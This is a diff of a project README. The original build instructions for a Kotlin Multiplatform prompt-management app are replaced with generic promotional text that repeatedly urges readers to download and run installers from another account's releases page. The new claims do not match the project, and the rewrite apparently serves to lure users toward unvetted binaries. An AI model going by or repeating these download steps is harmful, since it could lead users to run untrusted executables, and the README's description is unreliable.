@@ -1,66 +1,89 @@
-# Prompt-Hub
+# 🚀 PromptHub - Create, Manage, and Share AI Prompts Easily
 
-Prompt-Hub is a centralized place to create, manage, and share prompts for AI models. It helps you build complex prompts, organize them, and collaborate with others.
+[![Download PromptHub](https://img.shields.io/badge/Download-PromptHub-blue.svg)](https://github.com/nurulfs/PromptHub/releases)
 
-## Demo
+## 🌟 Overview
 
-![ezgif-5af2f44aadd9d7](https://github.com/user-attachments/assets/59266d48-86be-4a76-ba17-9d480109c0e2)
+PromptHub is a centralized place to create, manage, and share prompts for AI models. It helps you build complex prompts, organize them, and collaborate with others. Whether you are a beginner or an expert, PromptHub makes it easy for everyone to work with AI prompts.
 
-## Project Structure
+## 📚 Features
 
-This is a Kotlin Multiplatform project targeting both Web and Server.
+- **User-Friendly Interface**: Navigate easily and find everything you need.
+- **Prompt Management**: Create and organize prompts in folders.
+- **Collaboration Tools**: Share your prompts with others easily.
+- **Custom Templates**: Use templates to create prompts quickly.
+- **JSON and Markdown Support**: Flexibly manage your data formats.
 
-* **[/server](./server/src/main/kotlin)** - Ktor server application.
-* **[/shared](./shared/src)** - Shared code between all targets.
+## 💻 System Requirements
 
-  * **[commonMain](./shared/src/commonMain/kotlin)** - Shared logic for all platforms.
-  * Platform-specific folders for additional code.
+To run PromptHub, ensure your computer meets these basic requirements:
 
-## Build and Run
+- **Operating System**: Windows 10 or higher, macOS Sierra or higher, or a Linux distribution.
+- **RAM**: At least 4 GB recommended.
+- **Storage**: Minimum of 100 MB available space.
 
-### Run Server
+## 🚀 Getting Started
 
-To build and run the development version of the server:
+To get started with PromptHub, follow these simple steps:
 
-**macOS/Linux:**
+1. **Visit the Download Page**: Click the link below to go to the Releases page where you can download the software.
 
-```bash
-./gradlew :server:run
-```
+   [Download PromptHub](https://github.com/nurulfs/PromptHub/releases)
 
-**Windows:**
+2. **Choose Your Version**: On the Releases page, scroll down to find the latest version and select the file relevant to your operating system.
 
-```bash
-.\gradlew.bat :server:run
-```
+3. **Download the File**: Click on the file to download it to your computer. The file will typically be in .exe for Windows, .dmg for macOS, or .AppImage for Linux.
+
+4. **Install PromptHub**: After downloading, locate the file in your downloads folder. Double-click the file to start the installation. Follow the on-screen instructions. 
+
+5. **Run the Application**: Once installed, you can find PromptHub in your applications folder. Click the icon to start using it.
+
+## 📥 Download & Install
+
+To download and install PromptHub, visit the page below:
+
+[Download PromptHub](https://github.com/nurulfs/PromptHub/releases)
+
+## 🤝 Community and Support
+
+If you encounter any issues or have questions, join our community:
+
+- **GitHub Issues**: Report problems and get support directly on our GitHub Issues page.
+- **User Documentation**: Access user guides and FAQs for further assistance.
+- **Community Forum**: Engage with other users and share your experiences.
+
+## 📖 Additional Resources
+
+Learn more about AI prompts and how to maximize the use of PromptHub:
+
+- **Getting Started Guide**: An in-depth guide to using PromptHub.
+- **Best Practices**: Tips on creating effective AI prompts.
+- **Updates and Roadmap**: Stay informed about future features and enhancements.
+
+## 🔗 Topics
+
+This project relates to the following topics:
+
+- ai
+- js
+- json
+- markdown
+- project
+- prompt
+- prompt-engineering
+- react
+- tool
+- tools
+- website
+
+## 🐛 Issues and Feedback
+
+We encourage you to report any bugs or suggest enhancements. Use the Issues section on GitHub to submit your feedback. Your input helps us improve PromptHub for everyone.
+
+## 🌐 License
+
+PromptHub is open-source software licensed under the MIT License. You are free to modify and distribute the code, but we appreciate credit and acknowledgment for our work.
 
 ---
 
-### Run Web Application
-
-1. Install [Node.js](https://nodejs.org/en/download) (includes `npm`)
-
-2. Build Kotlin/JS shared code:
-
-   **macOS/Linux:**
-
-   ```bash
-   ./gradlew :shared:jsBrowserDevelopmentLibraryDistribution
-   ```
-
-   **Windows:**
-
-   ```bash
-   .\gradlew.bat :shared:jsBrowserDevelopmentLibraryDistribution
-   ```
-
-3. Build and run the web app:
-
-   ```bash
-   npm install
-   npm run start
-   ```
-
----
-
-Learn more about [Kotlin Multiplatform](https://www.jetbrains.com/help/kotlin-multiplatform-dev/get-started.html).
+With PromptHub, you can streamline your work with AI prompts. Follow these instructions, and you will be up and running in no time. Enjoy creating and sharing your prompts!
